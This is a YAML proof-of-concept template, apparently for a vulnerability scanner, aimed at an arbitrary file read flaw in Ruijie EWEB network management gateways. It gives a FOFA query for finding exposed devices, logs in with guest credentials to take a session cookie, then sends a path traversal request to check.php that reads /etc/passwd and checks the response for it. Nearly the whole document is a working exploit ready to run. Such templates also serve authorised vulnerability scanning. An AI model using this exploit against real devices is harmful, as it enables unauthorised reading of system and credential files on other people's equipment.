id: poc-yaml-ruijie-eweb-timeout-anyfile-read
info:
  name: 锐捷 EWEB timeout 任意文件读取漏洞
  severity: high
  tags:
  - 文件读取
  finger: eweb
  fofa: title="锐捷网络-EWEB网管系统" || app="Ruijie-EG易网关" && body="/login.php?a=version"
requests:
- method: POST
  path: /ddi/server/login.php
  headers:
    Content-Type: application/x-www-form-urlencoded
  data: username=guest&password=guest?
  expression: status_code == 200
  output:
  - regex_match(headers,"RUIJIEID=(?P<cookie>.*?);")
- method: GET
  path: /check.php?url=../../etc/passwd
  headers:
    Cookie: RUIJIEID={{.cookie}};user=guest
  expression: 'status_code == 200 &&

    contains(body,"root:") &&

    contains(body,"/bin") &&

    !contains(body,"<")

    '
variables: {}
transport: http
